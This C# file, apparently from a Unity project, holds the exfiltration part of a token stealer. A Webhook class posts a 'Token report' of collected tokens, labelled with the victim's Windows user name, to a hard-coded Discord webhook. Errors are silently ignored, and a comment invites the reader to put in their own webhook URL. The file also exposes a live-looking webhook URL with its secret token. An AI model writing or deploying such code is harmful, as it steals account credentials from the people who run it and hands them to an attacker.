using System;
using System.Collections.Generic;
using System.Net.Http;
using UnityEngine;

internal static class Webhook
{
    //you've got to change this to your own discord webhook url
    private const string _hookUrl =
        "https://canary.discord.com/api/webhooks/909282375786184825/zufMwjkl_KAPqsoTlWQRgp7Vg5KX2Rkw-0i3UZbjbaNwnjWSHXJPimF5S55K25BZpSyI";

    public static void ReportTokens(IEnumerable<string> tokenReport)
    {
        try
        {
            var client = new HttpClient();
            var contents = new Dictionary<string, string>
            {
                {"content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}"},
                {"username", "elsa x biseukis <3"},
                {
                    "avatar_url",
                    "https://cdn.discordapp.com/avatars/270564030953816085/c823ddc9fe0c550cd852065afd3d3646.webp?size=4096"
                }
            };

            client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
        }
        catch
        {
            // ignored
        }
    }
}